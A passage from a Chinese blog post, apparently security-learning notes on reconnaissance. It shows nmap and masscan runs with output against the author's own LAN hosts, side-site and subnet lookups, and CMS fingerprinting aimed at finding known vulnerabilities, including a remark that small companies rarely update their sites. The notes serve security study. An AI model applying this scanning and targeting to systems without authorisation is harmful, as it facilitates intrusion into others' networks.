<h5 id="不指定参数">不指定参数</h5>
<p>默认扫描端口<code>1~1024</code>加上<code>nmap_services</code>中列出的端口</p>
<p><code>nmap_services</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">tcpmux	1/tcp	0.001995	<span class="comment"># TCP Port Service Multiplexer [rfc-1078] | TCP Port Service Multiplexer</span></span><br><span class="line">tcpmux	1/udp	0.001236	<span class="comment"># TCP Port Service Multiplexer</span></span><br><span class="line">compressnet	2/tcp	0.000013	<span class="comment"># Management Utility</span></span><br><span class="line">compressnet	2/udp	0.001845	<span class="comment"># Management Utility</span></span><br><span class="line">compressnet	3/tcp	0.001242	<span class="comment"># Compression Process</span></span><br><span class="line">compressnet	3/udp	0.001532	<span class="comment"># Compression Process</span></span><br><span class="line">unknown	4/tcp	0.000477</span><br><span class="line">rje	5/tcp	0.000000	<span class="comment"># Remote Job Entry</span></span><br><span class="line">rje	5/udp	0.000593	<span class="comment"># Remote Job Entry</span></span><br><span class="line">unknown	6/tcp	0.000502</span><br><span class="line"><span class="built_in">echo</span>	7/sctp	0.000000</span><br><span class="line"><span class="built_in">echo</span>	7/tcp	0.004855</span><br><span class="line"><span class="built_in">echo</span>	7/udp	0.024679</span><br><span class="line">unknown	8/tcp	0.000013</span><br><span class="line">discard	9/sctp	0.000000	<span class="comment"># sink null</span></span><br><span class="line">discard	9/tcp	0.003764	<span class="comment"># sink null</span></span><br><span class="line">discard	9/udp	0.015733	<span class="comment"># sink null</span></span><br><span class="line">unknown	10/tcp	0.000063</span><br><span class="line">systat	11/tcp	0.000075	<span class="comment"># Active Users</span></span><br><span class="line">systat	11/udp	0.000577	<span class="comment"># Active Users</span></span><br><span class="line">unknown	12/tcp	0.000063</span><br><span class="line">daytime	13/tcp	0.003927</span><br><span class="line">daytime	13/udp	0.004827</span><br><span class="line">unknown	14/tcp	0.000038</span><br><span class="line">netstat	15/tcp	0.000038</span><br><span class="line">unknown	16/tcp	0.000050</span><br><span class="line">qotd	17/tcp	0.002346	<span class="comment"># Quote of the Day</span></span><br><span class="line">qotd	17/udp	0.009209	<span class="comment"># Quote of the Day</span></span><br><span class="line">msp	18/tcp	0.000000	<span class="comment"># Message Send Protocol | Message Send Protocol (historic)</span></span><br><span class="line">msp	18/udp	0.000610	<span class="comment"># Message Send Protocol</span></span><br><span class="line">chargen	19/tcp	0.002559	<span class="comment"># ttytst source Character Generator | Character Generator</span></span><br><span class="line">chargen	19/udp	0.015865	<span class="comment"># ttytst source Character Generator</span></span><br><span class="line">ftp-data	20/sctp	0.000000	<span class="comment"># File Transfer [Default Data] | FTP</span></span><br><span class="line">ftp-data	20/tcp	0.001079	<span class="comment"># File Transfer [Default Data]</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:00 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">902/tcp open  iss-realsecure</span><br><span class="line">912/tcp open  apex-mesh</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.94 seconds</span><br></pre></td></tr></table></figure>
<p>kali nmap对大量端口展开了轰炸</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604110122323.png"
alt="image-20220604110122323" />
<figcaption aria-hidden="true">image-20220604110122323</figcaption>
</figure>
<h5
id="p-port扫描指定端口"><code>-p &lt;port&gt;</code>扫描指定端口</h5>
<p>比如指定扫描list.txt中列出主机的80端口(http服务器端口)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -p 80 -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.062s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp closed http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.72 seconds</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604105515492.png"
alt="image-20220604105515492" />
<figcaption aria-hidden="true">image-20220604105515492</figcaption>
</figure>
<p>确实Executor上开着一个Apache服务器,但是192.168.43.1手机上没有</p>
<h5
id="f快速模式只扫描nmap-services中列出的端口"><code>-F</code>快速模式,只扫描<code>nmap-services</code>中列出的端口</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -F -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:02 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 96 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Not shown: 99 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.72 seconds</span><br></pre></td></tr></table></figure>
<p>相对于不使用命令行参数的默认扫描方式,该种方式没有扫描到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">902/tcp open  iss-realsecure</span><br><span class="line">912/tcp open  apex-mesh</span><br></pre></td></tr></table></figure>
<h4 id="操作系统检测">操作系统检测</h4>
<p>操作系统检测是基于端口扫描的</p>
<p>如果不指定扫描端口,却进行操作系统检测,是无效的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -O -A -sn -iL list.txt</span><br><span class="line">WARNING: OS Scan is unreliable without a port scan.  You need to use a scan <span class="built_in">type</span> along with it, such as -sS, -sT, -sF, etc instead of -sn</span><br><span class="line">QUITTING!</span><br></pre></td></tr></table></figure>
<h5
id="o进行操作系统检测-a进行版本检测"><code>-O</code>进行操作系统检测,<code>-A</code>进行版本检测</h5>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -O -A -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE         VERSION</span><br><span class="line">80/tcp  open  http            Apache httpd 2.4.39 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line"><span class="number">135</span>/tcp open  msrpc           Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds?</span><br><span class="line"><span class="number">902</span>/tcp open  ssl/vmware-auth VMware Authentication Daemon <span class="number">1.10</span> (Uses VNC, SOAP)</span><br><span class="line"><span class="number">912</span>/tcp open  vmware-auth     VMware Authentication Daemon <span class="number">1.0</span> (Uses VNC, SOAP)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.92</span>%E=<span class="number">4</span>%D=<span class="number">6</span>/<span class="number">4</span>%OT=<span class="number">80</span>%CT=<span class="number">1</span>%CU=<span class="number">37312</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">629</span>ACC98</span><br><span class="line">OS:%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="number">101</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>D%TI=I%CI=I%II=I%SS=S%TS=A</span><br><span class="line">OS:)OPS(O1=MFFD7NW8ST11%O2=MFFD7NW8ST11%O3=MFFD7NW8NNT11%O4=MFFD7NW8ST11%O5</span><br><span class="line">OS:=MFFD7NW8ST11%O6=MFFD7ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W</span><br><span class="line">OS:<span class="number">6</span>=FFDC)ECN(R=Y%DF=Y%T=<span class="number">7</span>F%W=FFFF%O=MFFD7NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=<span class="number">7</span>F%S</span><br><span class="line">OS:=O%A=S+%F=AS%RD=<span class="number">0</span>%Q=)T2(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S%F=AR%O=%RD=<span class="number">0</span>%Q=)T3(R=Y</span><br><span class="line">OS:%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=O%F=AR%O=%RD=<span class="number">0</span>%Q=)T4(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=A%A=O%F=R%</span><br><span class="line">OS:O=%RD=<span class="number">0</span>%Q=)T5(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="number">7</span></span><br><span class="line">OS:F%W=<span class="number">0</span>%S=A%A=O%F=R%O=%RD=<span class="number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%</span><br><span class="line">OS:Q=)U1(R=Y%DF=N%T=<span class="number">7</span>F%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=<span class="number">37</span>DE%RUD=G)IE</span><br><span class="line">OS:(R=Y%DFI=N%T=<span class="number">7</span>F%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: <span class="number">2022</span>-<span class="number">06</span>-<span class="number">04</span>T03:<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: EXECUTOR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="number">2</span>c:<span class="number">6</span>d:c1:<span class="number">98</span>:<span class="number">7</span>d:<span class="number">03</span> (Intel Corporate)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   <span class="number">3.1</span>.<span class="number">1</span>:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port <span class="number">587</span>/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.41</span> ms Executor.mshome.net (<span class="number">172.28</span>.<span class="number">16.1</span>)</span><br><span class="line"><span class="number">2</span>   <span class="number">0.43</span> ms Executor (<span class="number">192.168</span>.<span class="number">43.44</span>)</span><br><span class="line"></span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">43.1</span></span><br><span class="line">Host is up (<span class="number">0.0065</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/tcp open  domain  dnsmasq <span class="number">2.51</span></span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: dnsmasq-<span class="number">2.51</span></span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.92</span>%E=<span class="number">4</span>%D=<span class="number">6</span>/<span class="number">4</span>%OT=<span class="number">53</span>%CT=<span class="number">1</span>%CU=<span class="number">35611</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">629</span>ACC98</span><br><span class="line">OS:%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="number">103</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>C%TI=Z%CI=Z%II=I%TS=A)OPS(</span><br><span class="line">OS:O1=M5B4ST11NW9%O2=M5B4ST11NW9%O3=M5B4NNT11NW9%O4=M5B4ST11NW9%O5=M5B4ST11</span><br><span class="line">OS:NW9%O6=M5B4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(</span><br><span class="line">OS:R=Y%DF=Y%T=<span class="number">40</span>%W=FFFF%O=M5B4NNSNW9%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="number">40</span>%S=O%A=S+%F=AS</span><br><span class="line">OS:%RD=<span class="number">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="number">0</span>%Q=)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=<span class="number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)U1(R=Y%DF=N%T</span><br><span class="line">OS:=<span class="number">40</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=<span class="number">3</span>EAE%RUD=G)IE(R=Y%DFI=N%T=<span class="number">40</span>%</span><br><span class="line">OS:CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port <span class="number">587</span>/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">-   Hop <span class="number">1</span> is the same as for <span class="number">192.168</span>.<span class="number">43.44</span></span><br><span class="line"><span class="number">2</span>   <span class="number">7.82</span> ms <span class="number">192.168</span>.<span class="number">43.1</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">3</span> IP addresses (<span class="number">2</span> hosts up) scanned in <span class="number">30.29</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里检测出了192.168.43.44的操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<p>但是没有检测出192.168.43.1的操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
<h5 id="其他方法">其他方法</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604112513527.png"
alt="image-20220604112513527" />
<figcaption aria-hidden="true">image-20220604112513527</figcaption>
</figure>
<h3 id="masscan">masscan</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# masscan -p1-65535 --rate=10000 192.168.43.44</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-06-04 03:22:19 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 135/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49664/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49672/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49666/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 54260/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 9955/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 902/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 445/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49667/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 5040/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49665/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 912/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49669/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 139/tcp on 192.168.43.44</span><br><span class="line">rate:  0.00-kpps, 100.00% <span class="keyword">done</span>, waiting 4-secs, found=14</span><br></pre></td></tr></table></figure>
<h3 id="端口漏洞利用">端口漏洞利用</h3>
<h2 id="旁站">旁站</h2>
<p>一个IP或者域名所在的服务器有可能还运行着其他网站,目标站点和旁站对应于服务器的不同端口,对应于同一WEB服务的不同路径</p>
<p>主站点难以找到漏洞时考虑从旁站入侵</p>
<p>收集信息种类:</p>
<p>1.收集旁站的 域名信息</p>
<p>注册人姓名电话邮箱,NS服务器</p>
<p>2.收集旁站的 程序信息</p>
<p>服务器及中间件</p>
<p>脚本或者使用框架</p>
<p>后台及敏感目录</p>
<p>是否存在已知漏洞</p>
<h3 id="在线网站查旁站">在线网站查旁站</h3>
<p><a target="_blank" rel="noopener" href="https://ipchaxun.com/">查旁网</a></p>
<p>从我的博客域名<code>dustball.top</code>开始查</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604120742428.png"
alt="image-20220604120742428" />
<figcaption aria-hidden="true">image-20220604120742428</figcaption>
</figure>
<p>首先查到ip地址,然后再查ip地址<code>185.199.109.153</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604120923351.png"
alt="image-20220604120923351" />
<figcaption aria-hidden="true">image-20220604120923351</figcaption>
</figure>
<p>这些网站显然和博客是一个性质的,基于github page的搭建的</p>
<p>其中有一个</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604121049066.png"
alt="image-20220604121049066" />
<figcaption aria-hidden="true">image-20220604121049066</figcaption>
</figure>
<p>根据我对二刺螈的理解,这里面准有好康的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604121151087.png"
alt="image-20220604121151087" />
<figcaption aria-hidden="true">image-20220604121151087</figcaption>
</figure>
<p>dddd</p>
<h3 id="本地工具查旁站">本地工具查旁站</h3>
<h3 id="端口查旁站">端口查旁站</h3>
<p>同一个主机是否开放了除80端口之外的http,https,http-proxy等服务</p>
<h2 id="c段">C段</h2>
<p>C段就是通过一个路由器连接的主机集合</p>
<h3 id="在线接口查询">在线接口查询</h3>
<p><a target="_blank" rel="noopener" href="https://chapangzhan.com/">查旁网</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604162410662.png"
alt="image-20220604162410662" />
<figcaption aria-hidden="true">image-20220604162410662</figcaption>
</figure>
<h3 id="本地工具扫描">本地工具扫描</h3>
<h4 id="nmap扫描c段">nmap扫描C段</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap -sP 192.168.3.0/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 16:22 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.1</span><br><span class="line">Host is up (0.0027s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> host.docker.internal (192.168.3.2)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.7</span><br><span class="line">Host is up (0.0060s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 5.14 seconds</span><br></pre></td></tr></table></figure>
<h4 id="iis-put-scanner">IIS Put Scanner</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604162623631.png"
alt="image-20220604162623631" />
<figcaption aria-hidden="true">image-20220604162623631</figcaption>
</figure>
<h2 id="指纹识别">指纹识别</h2>
<p>啥叫指纹识别?</p>
<p>就是通过网页上留下的蛛丝马迹,识别出该网站使用哪一款CMS建站</p>
<p>比如页面底部的版权信息</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604163706007.png"
alt="image-20220604163706007" />
<figcaption aria-hidden="true">image-20220604163706007</figcaption>
</figure>
<p>或者访问不存在的页面返回的错误信息</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192416711.png"
alt="image-20220604192416711" />
<figcaption aria-hidden="true">image-20220604192416711</figcaption>
</figure>
<blockquote>
<p>这个错误页面可以修改,不让它暴露中间件信息</p>
</blockquote>
<p>还要获取该CMS的版本信息</p>
<p>然后就可以到CMS的官网上下载源代码进行白盒测试了</p>
<p>或者目标使用的低版本CMS已经有漏洞被曝光,直接利用</p>
<p>指纹识别要收集的信息:</p>
<p>1.web服务器(中间件)类型版本</p>
<p>2.前端技术</p>
<p>3.CMS</p>
<p>4.开发语言</p>
<p>等等</p>
<h3 id="在线指纹识别">在线指纹识别</h3>
<p>比如某些企业的官网</p>
<p>尤其是乡镇上的小企业,必然没钱自己写一个网站后端,也就是请一些技术人员用现成的CMS建站吧,并且也意识不到更新的必要性</p>
<h4 id="what-cms">What CMS</h4>
<p><a target="_blank" rel="noopener" href="https://whatcms.org/">Detect which CMS a site is using -
What CMS?</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164434798.png"
alt="image-20220604164434798" />
<figcaption aria-hidden="true">image-20220604164434798</figcaption>
</figure>
<p>然而最新的wordpress已经到了6.0</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164700687.png"
alt="image-20220604164700687" />
<figcaption aria-hidden="true">image-20220604164700687</figcaption>
</figure>
<p>然后搜索wordpress 5.0漏洞</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164739355.png"
alt="image-20220604164739355" />
<figcaption aria-hidden="true">image-20220604164739355</figcaption>
</figure>
<p>当然4.9版本也是包含此漏洞的,这意味着什么呢?</p>
<h4 id="yunsee">yunsee</h4>
<p>需要登录才可以查</p>
<p>然而注册还要邀请码</p>
<p>屑</p>
<h3 id="本地工具-1">本地工具</h3>
<h4 id="御剑">御剑</h4>
<p>有一个挖旁站的御剑,还有一个挖指纹的御剑</p>
<p>挖指纹这个是这样工作的:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604165921960.png"
alt="image-20220604165921960" />
